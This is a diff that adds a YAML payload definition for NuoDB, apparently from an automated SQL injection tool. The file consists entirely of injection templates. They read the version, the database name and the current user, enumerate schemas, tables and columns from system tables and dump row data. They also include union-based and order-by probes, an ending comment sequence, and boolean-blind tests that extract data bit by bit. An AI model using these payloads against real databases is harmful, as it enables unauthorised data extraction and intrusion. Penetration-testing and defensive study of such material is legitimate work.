@@ -1,0 +1,139 @@
+vendor: ""
+resource: 
+ info: |
+  select
+      GETRELEASEVERSION() 
+      || '${ENCLOSE_VALUE_SQL}' 
+      || database() 
+      || '${ENCLOSE_VALUE_SQL}' 
+      || current_user() 
+      || '${TRAIL_SQL}'
+      r
+  from dual
+ schema: 
+  database: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from (
+           select distinct schema s
+           from system.schemas
+       ) t
+       {limit}
+   ) a
+  table: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from (
+           select distinct tablename s
+           from system.tables
+           where schema = '${DATABASE}'
+       ) t
+       {limit}
+   ) a
+  column: |
+   select 
+       rr
+       || '${TRAIL_SQL}'
+       r
+   from (
+       select 
+           '${ENCLOSE_VALUE_SQL}'
+           || t.s
+           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           rr
+       from (
+           select distinct field s
+           from system.indexfields
+           where schema = '${DATABASE}'
+           and tablename = '${TABLE}'
+       ) t
+       {limit}
+   ) a
+  row: 
+   query: |
+    select 
+        rr
+        || '${TRAIL_SQL}'
+        r
+    from (
+        select 
+            '${ENCLOSE_VALUE_SQL}'
+            || s
+            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            rr
+        from (
+            select distinct ${FIELDS} s 
+            from ${DATABASE}.${TABLE}
+        ) t
+        {limit}
+    ) a
+   fields: 
+    field: "${FIELD}"
+    concat: "|| '%7f' ||"
+strategy: 
+ configuration: 
+  slidingWindow: |
+   select 
+       '${LEAD}' 
+       || substr(
+           r, 
+           ${INDEX},
+           ${CAPACITY}
+       ) r
+   from (${INJECTION})x
+  limit: "limit ${LIMIT}, 1"
+  failsafe: "select '' || (1337${INDICE}7330%2b1) r from dual"
+  calibrator: "replicate('${CALIBRATOR_SQL}', 65536)"
+  limitBoundary: 0
+  endingComment: "--+-"
+  fingerprint: 
+   errorMessage: 
+    - nuodb
+ normal: 
+  indices: "union select ${RESULT_RANGE} from (${INDICE_UNIQUE})"
+  capacity: "(select '${LEAD}${INDICE}' || ${CALIBRATOR} from dual)"
+  orderBy: "order by 1337"
+ boolean: 
+  test: 
+   falses: 
+    - "true = false"
+    - "true %21= true"
+    - "false %21= false"
+    - "1 = 2"
+    - "1 %21= 1"
+    - "2 %21= 2"
+   trues: 
+    - "true = true"
+    - "false = false"
+    - "true %21= false"
+    - "1 = 1"
+    - "2 = 2"
+    - "1 %21= 2"
+   initialization: "0%2b1 = 1"
+   bit: |
+    0 != (unicode(
+        substr(
+            (${INJECTION}), 
+            ${INDEX}, 
+            1
+        )
+    ) 
+    %26 ${BIT})
+   length: "char_length((${INJECTION})) > ${INDEX}"
+  blind: "and ${TEST}"
